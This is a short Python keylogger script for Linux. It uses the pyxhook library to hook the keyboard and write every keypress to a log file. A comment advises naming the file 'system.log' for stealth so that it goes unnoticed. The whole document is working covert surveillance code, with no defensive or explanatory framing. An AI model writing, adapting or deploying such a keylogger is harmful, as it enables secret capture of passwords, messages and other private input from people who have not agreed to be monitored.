import pyxhook  #linux version of pyhook
import glob
import os
import time

# function that appends the keypress
def logger(keypress):
	with open(logfile,'a') as keylog:
		keylog.write(keypress.Key)


# opening the log file, name it something klike system.log for stealth
logfile = os.environ.get('pylogger_file', os.path.expanduser('~/Documents/system.log'))

# compulsary line
hookmanager = pyxhook.HookManager()
hookmanager.KeyDown = logger
hookmanager.HookKeyboard()
hookmanager.start()

